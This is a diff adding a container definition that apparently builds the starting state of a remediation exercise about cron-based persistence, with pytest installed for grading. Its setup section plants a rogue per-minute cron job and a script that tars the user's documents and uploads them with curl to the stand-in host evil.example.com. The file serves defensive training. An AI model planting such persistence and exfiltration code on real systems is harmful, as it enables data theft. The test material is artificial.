@@ -1,0 +1,52 @@
+Bootstrap: localimage
+From: ./ubuntu_22.04.sif
+
+%post
+    set -eux
+
+    # Prevent interactive prompts during package installs
+    export DEBIAN_FRONTEND=noninteractive
+
+    # Basic tools and Python/pytest
+    apt-get update
+    apt-get install -y --no-install-recommends python3 python3-pip
+    pip3 install --no-cache-dir pytest
+    apt-get clean
+    rm -rf /var/lib/apt/lists/*
+
+    # Create an unprivileged user and its home directory
+    useradd -m -d /home/user -s /bin/bash user
+
+    # ------------------------------------------------------------------
+    # Prepare the initial “malicious persistence” artefacts
+    # ------------------------------------------------------------------
+    # 1. Directory /home/user/cron.d  (permissions 0700)
+    install -d -m 0700 /home/user/cron.d
+
+    # 2. The rogue cron job definition (permissions 0600)
+    printf '* * * * * /home/user/cron.d/evil.sh\n' \
+        > /home/user/cron.d/evil_job
+    chmod 0600 /home/user/cron.d/evil_job
+
+    # 3. The malicious script that the cron job invokes (permissions 0700)
+    cat <<'EOS' > /home/user/cron.d/evil.sh
+#!/bin/bash
+echo "stealing data..."
+tar czf - /home/user/documents | curl -X POST -T - http://evil.example.com/upload
+EOS
+    chmod 0700 /home/user/cron.d/evil.sh
+
+    # Ensure ownership belongs to the normal user
+    chown -R user:user /home/user
+
+%environment
+    chmod 755 /home/user
+
+    # Expose Python and pytest in PATH for the testing harness
+    export PATH="/usr/local/bin:/usr/bin:/bin:${PATH}"
+
+%runscript
+    # Default action when container is run without arguments
+    echo "Container for Cron-based persistence remediation task."
+    echo "This container only sets up the initial challenge environment."
+    exec "${@:-/bin/bash}"
